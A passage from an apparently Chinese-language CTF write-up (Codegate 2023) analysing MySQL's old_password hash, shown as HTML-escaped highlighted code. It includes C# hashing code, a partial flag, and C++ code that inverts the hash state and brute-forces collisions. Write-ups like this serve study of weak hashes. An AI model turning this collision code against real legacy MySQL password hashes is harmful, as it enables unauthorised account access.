&lt;span class=&#34;comment&#34;&gt;// 111....11, 31bits&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = nr &amp;amp; mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = nr2 &amp;amp; mask;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt; hash = String.Format(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#123;0:X&amp;#125;&amp;#123;1:X&amp;#125;&amp;quot;&lt;/span&gt;, result[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;], result[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; hash.ToLower();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Main&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;[] args&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Console.WriteLine (mysql_old_password(&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaa&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到，v1和v2的hash值碰撞只需要加入空格就可以：因为该算法完全忽略空格和制表符。&lt;br&gt;这样前一半flag就知道了：&lt;code&gt;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP&lt;/code&gt;&lt;br&gt;核心问题在于使v2的hash值等于&lt;code&gt;6368616368613230&lt;/code&gt;，v2必须以&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;结尾，我们唯一能改变的就是中间的字符串。&lt;br&gt;经过搜寻，找到一个帖子：&lt;a href=&#34;https://security.stackexchange.com/questions/3133/mysql-old-password-cryptanalysis&#34;&gt;mysql-old-password-cryptanalysis&lt;/a&gt;&lt;br&gt;里面给出了一段逆向推导nr与nr2的代码，以及一篇分析该算法的论文：F. Muller and T. Peyrin “Cryptanalysis of T-Function-Based Hash Functions” in International Conference on Information Security and Cryptology - ICISC 2006&lt;br&gt;不过需要注意的是该论文中的算法和实际算法有一个微小差异：nr2对应公式的&lt;code&gt;=&lt;/code&gt;应为&lt;code&gt;+=&lt;/code&gt;。&lt;br&gt;逆向计算nr&amp;#x2F;nr2：&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;pre&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; level = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; level; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout &amp;lt;&amp;lt; &lt;span class=&#34;string&#34;&gt;&amp;quot;-&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;bruteforce&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;comment&#34;&gt;/*debug only!*/&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; level = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; charset[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&amp;quot;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// sorted by ascii&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//这里的代码假设只有以上字符存在，事实上完全没有必要：ascii 32-127都可以。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;oldpw_rev&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;function&#34;&gt;              &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; c, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;comment&#34;&gt;/*debug only!*/&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; level = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; nr, nr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; u, e, y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (len == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; add==&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; &amp;amp;&amp;amp; pnr2==&lt;span class=&#34;number&#34;&gt;0x12345671&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;// Modify to target value when MiM-ing&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr = pnr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 = pnr2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// c = cc[len - 1];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add -= c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    u = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 = nr2 - ((u &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) ^ nr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nr2 &amp;amp;= &lt;span class=&#34;number&#34;&gt;0x7FFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    y = nr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (e = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; e &amp;lt; &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;; e++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123; &lt;span class=&#34;comment&#34;&gt;// guess 6 lsb of nr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; z, g;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        z = (e + add) * c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        g = (e ^ z) &amp;amp; &lt;span class=&#34;number&#34;&gt;0x3F&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (g == (y &amp;amp; &lt;span class=&#34;number&#34;&gt;0x3F&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123; &lt;span class=&#34;comment&#34;&gt;// must matches, otherwise reject it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;// Now 8 LSB of nr known, byte-by-byte derive previous nr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = e;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            x = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nr = y ^ (z + (x &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nr &amp;amp;= &lt;span class=&#34;number&#34;&gt;0x7FFFFFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;bruteforce&lt;/span&gt;(nr, nr2, add, len - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, level + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                cout&amp;lt;&amp;lt;&lt;span class=&#34;string&#34;&gt;&amp;quot;assume:&amp;quot;&lt;/span&gt;&amp;lt;&amp;lt;c&amp;lt;&amp;lt;endl;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;bruteforce&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr2, &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; add, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; len, &lt;span class=&#34;comment&#34;&gt;/*debug only!*/&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; level)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (add&lt;span class=&#34;number&#34;&gt;-7&lt;/span&gt;&amp;lt;&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;*len||add&lt;span class=&#34;number&#34;&gt;-7&lt;/span&gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;122&lt;/span&gt;*len) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; _=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;_&amp;lt;&lt;span class=&#34;number&#34;&gt;63&lt;/span&gt;;_++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// Maybe剪枝here&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;oldpw_rev&lt;/span&gt;(pnr,pnr2,add,charset[_],len,level)==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;pre&lt;/span&gt;(level);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;nr:%x   nr2:%x\n&amp;quot;&lt;/span&gt;, pnr, pnr2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//eg: aaaa&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; pnr = &lt;span class=&#34;number&#34;&gt;0xA8D6917A&lt;/span&gt;, pnr2 = &lt;span class=&#34;number&#34;&gt;0x6FAB63E5&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//最终的nr, nr2，来自上文的C#代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cout &amp;lt;&amp;lt; &lt;span class=&#34;built_in&#34;&gt;bruteforce&lt;/span&gt;(pnr, pnr2, &lt;span class=&#34;number&#34;&gt;97&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/*add*/&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;/*length*/&lt;/span&gt;) &amp;lt;&amp;lt; endl; &lt;span class=&#34;comment&#34;&gt;// ! initial value of add is 7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也就是，在已知add值（字符串的前缀ASCII和）以及当前字符的情况下，对于平凡情况（无多解），能在常数时间确定上一个nr&amp;#x2F;nr2对的值。&lt;br&gt;一个朴素的思路是暴力枚举当前位的字符与add值。&lt;br&gt;暴力计算的话时间复杂度肯定是无法接受的（O(64^n)，5步需要约1分钟）。我们理一下现在已知什么，需要求解什么。请注意：我们需要的只是hash碰撞，不代表flag也是以&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;结尾的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;v2的形式：&lt;code&gt;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP&amp;lt;???&amp;gt;i_love_you&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;FLAG的总长度为78-79（因为前一半flag长为39）&lt;/li&gt;
&lt;li&gt;最终hash(v2)&amp;#x3D;&lt;code&gt;6368616368613230&lt;/code&gt; -&amp;gt; 最终的nr&amp;#x2F;nr2&lt;/li&gt;
&lt;li&gt;前一半flag的add值为3430：&lt;code&gt;sum([ord(i) for i in &amp;quot;codegate2023&amp;#123;Mysql_olD_P455woRD_I5_CoMP&amp;quot;])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;结尾的11个字符&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;对应add值：1207&lt;/li&gt;
&lt;li&gt;未知：整个flag字符串的add值&lt;ul&gt;
&lt;li&gt;但add值的可能范围很有限，我们可以容易计算出上下界：下界为3430+39*32&amp;#x3D;4678，上界为3430+40*127&amp;#x3D;8510&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;并且，这个范围内合法的add值占比并不高：对于一个可能的add值，往回推结尾的那11个字符&lt;code&gt;i_love_you&amp;#125;&lt;/code&gt;必须都有解&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
